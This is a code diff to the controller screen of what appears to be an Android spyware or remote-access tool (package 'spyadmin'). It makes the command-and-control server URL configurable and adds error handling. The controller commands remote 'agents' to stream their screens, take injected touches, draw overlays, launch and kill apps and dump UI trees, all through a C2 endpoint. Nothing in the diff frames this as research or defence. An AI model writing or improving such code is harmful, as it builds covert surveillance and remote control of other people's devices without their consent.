@@ -1,6 +1,7 @@
 package com.spyadmin
 
 import android.app.AlertDialog
+import android.content.SharedPreferences
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Bundle
@@ -38,10 +39,13 @@ class RemoteControlActivity : AppCompatActivity() {
     private var lastTouchY = 0f
     private var scaleX = 1f
     private var scaleY = 1f
+    private lateinit var prefs: SharedPreferences
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_remote_control)
+
+        prefs = getSharedPreferences("admin_config", MODE_PRIVATE)
 
         agent = gson.fromJson(intent.getStringExtra("agent")!!, Agent::class.java)
 
@@ -50,7 +54,7 @@ class RemoteControlActivity : AppCompatActivity() {
         btnStartStream = findViewById(R.id.btnStartStream)
         btnStopStream = findViewById(R.id.btnStopStream)
 
-        tvStatus.text = "${agent.hostname} (${agent.id.substring(0, 8)})"
+        tvStatus.text = "${agent.hostname} (${agent.id.substring(0, min(8, agent.id.length))})"
 
         btnStartStream.setOnClickListener { startStream() }
         btnStopStream.setOnClickListener { stopStream() }
@@ -71,12 +75,20 @@ class RemoteControlActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnUI).setOnClickListener { showUIDialog(null) }
     }
 
+    private fun getC2Url(): String {
+        return prefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
+    }
+
     private fun startStream() {
         sendTask("remote_control", mapOf("action" to "start_stream", "fps" to 20, "quality" to 80, "scale" to 0.8f)) { resp ->
-            val result = gson.fromJson(resp, Map::class.java)
-            if (result["status"] == "requires_projection_permission") {
-                streaming = true
-                pollFrames()
+            try {
+                val result = gson.fromJson(resp, Map::class.java)
+                if (result["status"] == "requires_projection_permission") {
+                    streaming = true
+                    pollFrames()
+                }
+            } catch (e: Exception) {
+                Log.e("RemoteControl", "Parse error", e)
             }
         }
     }
@@ -89,14 +101,18 @@ class RemoteControlActivity : AppCompatActivity() {
     private fun pollFrames() {
         if (!streaming) return
         sendTask("remote_control", mapOf("action" to "get_frame")) { resp ->
-            val result = gson.fromJson(resp, Map::class.java)
-            result["image"]?.let { b64 ->
-                val bytes = Base64.decode(b64 as String, Base64.NO_WRAP)
-                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
-                runOnUiThread {
-                    ivScreen.setImageBitmap(bitmap)
-                    updateScale()
+            try {
+                val result = gson.fromJson(resp, Map::class.java)
+                result["image"]?.let { b64 ->
+                    val bytes = Base64.decode(b64 as String, Base64.NO_WRAP)
+                    val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                    runOnUiThread {
+                        ivScreen.setImageBitmap(bitmap)
+                        updateScale()
+                    }
                 }
+            } catch (e: Exception) {
+                Log.e("RemoteControl", "Frame decode error", e)
             }
             handler.postDelayed({ pollFrames() }, 50)
         }
@@ -109,8 +125,8 @@ class RemoteControlActivity : AppCompatActivity() {
         val imgH = drawable.intrinsicHeight.toFloat()
         val viewW = ivScreen.width.toFloat()
         val viewH = ivScreen.height.toFloat()
-        scaleX = imgW / viewW
-        scaleY = imgH / viewH
+        scaleX = if (viewW > 0) imgW / viewW else 1f
+        scaleY = if (viewH > 0) imgH / viewH else 1f
     }
 
     private fun handleTouch(event: MotionEvent): Boolean {
@@ -149,29 +165,33 @@ class RemoteControlActivity : AppCompatActivity() {
 
     private fun toggleOverlay() {
         sendTask("remote_control", mapOf("action" to "start_overlay")) { resp ->
-            val result = gson.fromJson(resp, Map::class.java)
-            if (result["status"] == "overlay_started") {
-                sendTask("remote_control", mapOf(
-                    "action" to "draw_overlay",
-                    "shapes" to listOf(mapOf("type" to "circle", "x" to 500f, "y" to 500f, "radius" to 50f, "color" to 0xFF00FF00))
-                )) { _ -> }
-            }
+            try {
+                val result = gson.fromJson(resp, Map::class.java)
+                if (result["status"] == "overlay_started") {
+                    sendTask("remote_control", mapOf(
+                        "action" to "draw_overlay",
+                        "shapes" to listOf(mapOf("type" to "circle", "x" to 500f, "y" to 500f, "radius" to 50f, "color" to 0xFF00FF00))
+                    )) { _ -> }
+                }
+            } catch (e: Exception) { }
         }
     }
 
     private fun showAppsDialog() {
         sendTask("remote_control", mapOf("action" to "list_running")) { resp ->
-            val result = gson.fromJson(resp, Map::class.java)
-            val apps = result["apps"] as? List<*> ?: return@sendTask
-            val items = apps.map { it.toString() }.toTypedArray()
-            AlertDialog.Builder(this)
-                .setTitle("Running Apps")
-                .setItems(items) { _, i ->
-                    val app = apps[i] as Map<*, *>
-                    val pkg = app["package"] as String
-                    showAppOptions(pkg)
-                }
-                .show()
+            try {
+                val result = gson.fromJson(resp, Map::class.java)
+                val apps = result["apps"] as? List<*> ?: return@sendTask
+                val items = apps.map { it.toString() }.toTypedArray()
+                AlertDialog.Builder(this)
+                    .setTitle("Running Apps")
+                    .setItems(items) { _, i ->
+                        val app = apps[i] as Map<*, *>
+                        val pkg = app["package"] as String
+                        showAppOptions(pkg)
+                    }
+                    .show()
+            } catch (e: Exception) { }
         }
     }
 
@@ -183,8 +203,10 @@ class RemoteControlActivity : AppCompatActivity() {
                     0 -> sendTask("remote_control", mapOf("action" to "launch_app", "packageName" to pkg)) { _ -> }
                     1 -> sendTask("remote_control", mapOf("action" to "kill_app", "packageName" to pkg)) { _ -> }
                     2 -> sendTask("remote_control", mapOf("action" to "get_ui_tree")) { resp ->
-                        val result = gson.fromJson(resp, Map::class.java)
-                        showUIDialog(result["tree"] as? Map<*, *>)
+                        try {
+                            val result = gson.fromJson(resp, Map::class.java)
+                            showUIDialog(result["tree"] as? Map<*, *>)
+                        } catch (e: Exception) { }
                     }
                 }
             }
@@ -211,7 +233,7 @@ class RemoteControlActivity : AppCompatActivity() {
     }
 
     private fun request(method: String, endpoint: String, body: Any, callback: (String) -> Unit) {
-        val url = "https://c2.example.com:8443$endpoint"
+        val url = "${getC2Url()}$endpoint"
         val requestBody = body.toJson().toRequestBody("application/json".toMediaType())
         val request = Request.Builder().url(url).method(method, requestBody).build()
         client.newCall(request).enqueue(object : okhttp3.Callback {
